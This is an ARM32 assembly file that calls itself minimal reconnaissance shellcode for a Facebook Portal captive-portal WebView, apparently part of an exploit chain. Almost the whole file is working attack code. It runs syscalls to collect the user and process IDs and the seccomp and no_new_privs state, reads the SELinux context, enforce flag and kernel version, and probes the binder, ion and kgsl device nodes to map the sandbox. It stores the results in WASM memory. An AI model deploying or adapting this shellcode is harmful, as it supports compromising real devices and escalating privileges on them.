/*
 * recon_mini.s — Minimal reconnaissance shellcode
 * ARM32 EABI shellcode for Facebook Portal captive portal WebView
 *
 * Trimmed from recon_v1.s: removed /proc/self/status, /dev/ashmem,
 * /dev/alarm, /dev/hwbinder, /dev/vndbinder, sched_setaffinity.
 * Goal: fit in ≤200 words so padded total stays ≤236 (v20s match).
 *
 * Results at wasm_mem+0x1400 (R11 = base):
 *   +0x00: uid          +0x04: gid
 *   +0x08: pid          +0x0C: ppid
 *   +0x10: seccomp      +0x14: no_new_privs
 *   +0x18: open(selinux_attr)   +0x1C: selinux bytes read
 *   +0x20: open(/dev/binder)    +0x24: (reserved)
 *   +0x28: open(/dev/ion)       +0x2C: open(/dev/kgsl-3d0)
 *   +0x30: open(/proc/version)  +0x34: version bytes read
 *   +0x38: open(selinux/enforce) +0x3C: enforce value
 *
 * String buffers:
 *   +0x100..0x1FF: SELinux context (wasm+0x1500)
 *   +0xA00..0xBFF: /proc/version (wasm+0x1E00)
 *
 * Return code: 0x5500 = success
 */

  .syntax unified
  .arch armv7-a
  .text
  .align 2
  .globl _start
  .type _start, %function

.equ FRAME, 32

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #FRAME
    mov     r10, r4             /* R10 = wasm_mem base */
    add     r11, r10, #0x1400   /* R11 = results base */

    /* ═══ 1. getuid32 ═══ */
    mov     r7, #199
    svc     #0
    str     r0, [r11, #0x00]

    /* ═══ 2. getgid32 ═══ */
    mov     r7, #200
    svc     #0
    str     r0, [r11, #0x04]

    /* ═══ 3. getpid ═══ */
    mov     r7, #20
    svc     #0
    str     r0, [r11, #0x08]

    /* ═══ 4. getppid ═══ */
    mov     r7, #64
    svc     #0
    str     r0, [r11, #0x0C]

    /* ═══ 5. prctl(PR_GET_SECCOMP=21) ═══ */
    mov     r0, #21
    mov     r1, #0
    mov     r2, #0
    mov     r3, #0
    mov     r7, #172
    svc     #0
    str     r0, [r11, #0x10]

    /* ═══ 6. prctl(PR_GET_NO_NEW_PRIVS=39) ═══ */
    mov     r0, #39
    mov     r1, #0
    mov     r2, #0
    mov     r3, #0
    mov     r7, #172
    svc     #0
    str     r0, [r11, #0x14]

    /* ═══ 7. Read /proc/self/attr/current ═══ */
    mvn     r0, #99
    adr     r1, str_selinux
    mov     r2, #0              /* O_RDONLY */
    mov     r3, #0
    mov     r7, #322            /* __NR_openat */
    svc     #0
    str     r0, [r11, #0x18]
    cmp     r0, #0
    blt     selinux_done
    mov     r4, r0
    mov     r0, r4
    add     r1, r10, #0x1500
    mov     r2, #255
    mov     r7, #3
    svc     #0
    str     r0, [r11, #0x1C]
    cmp     r0, #0
    ble     se_close
    add     r2, r10, #0x1500
    mov     r3, #0
    strb    r3, [r2, r0]
se_close:
    mov     r0, r4
    mov     r7, #6
    svc     #0
    b       selinux_after
selinux_done:
    mov     r3, #0
    str     r3, [r11, #0x1C]
selinux_after:

    /* ═══ 8. Open /dev/binder ═══ */
    mvn     r0, #99
    adr     r1, str_binder
    mov     r2, #2              /* O_RDWR */
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x20]
    cmp     r0, #0
    blt     binder_skip
    mov     r7, #6
    svc     #0
binder_skip:

    /* ═══ 9. Open /dev/ion ═══ */
    mvn     r0, #99
    adr     r1, str_ion
    mov     r2, #2
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x28]
    cmp     r0, #0
    blt     ion_skip
    mov     r7, #6
    svc     #0
ion_skip:

    /* ═══ 10. Open /dev/kgsl-3d0 ═══ */
    mvn     r0, #99
    adr     r1, str_kgsl
    mov     r2, #2
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x2C]
    cmp     r0, #0
    blt     kgsl_skip
    mov     r7, #6
    svc     #0
kgsl_skip:

    /* ═══ 11. Read /proc/version ═══ */
    mvn     r0, #99
    adr     r1, str_version
    mov     r2, #0
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x30]
    cmp     r0, #0
    blt     ver_done
    mov     r4, r0
    mov     r0, r4
    add     r1, r10, #0x1E00
    mov     r2, #255
    mov     r7, #3
    svc     #0
    str     r0, [r11, #0x34]
    cmp     r0, #0
    ble     ver_close
    add     r2, r10, #0x1E00
    mov     r3, #0
    strb    r3, [r2, r0]
ver_close:
    mov     r0, r4
    mov     r7, #6
    svc     #0
    b       ver_after
ver_done:
    mov     r3, #0
    str     r3, [r11, #0x34]
ver_after:

    /* ═══ 12. /sys/fs/selinux/enforce ═══ */
    mvn     r0, #99
    adr     r1, str_enforce
    mov     r2, #0
    mov     r3, #0
    mov     r7, #322
    svc     #0
    str     r0, [r11, #0x38]
    cmp     r0, #0
    blt     enforce_done
    mov     r4, r0
    mov     r0, r4
    add     r1, r11, #0x3C      /* read into +0x3C (4 bytes) */
    mov     r2, #4
    mov     r7, #3
    svc     #0
    mov     r0, r4
    mov     r7, #6
    svc     #0
    b       enforce_after
enforce_done:
    mov     r3, #0xFF
    str     r3, [r11, #0x3C]
enforce_after:

    /* ═══ DONE ═══ */
    mov     r0, #0x5500
    add     sp, sp, #FRAME
    pop     {r4-r11, pc}

    /* ═══ String constants ═══ */
    .align 2
str_selinux:
    .asciz  "/proc/self/attr/current"
    .align 2
str_binder:
    .asciz  "/dev/binder"
    .align 2
str_ion:
    .asciz  "/dev/ion"
    .align 2
str_kgsl:
    .asciz  "/dev/kgsl-3d0"
    .align 2
str_version:
    .asciz  "/proc/version"
    .align 2
str_enforce:
    .asciz  "/sys/fs/selinux/enforce"
    .align 2
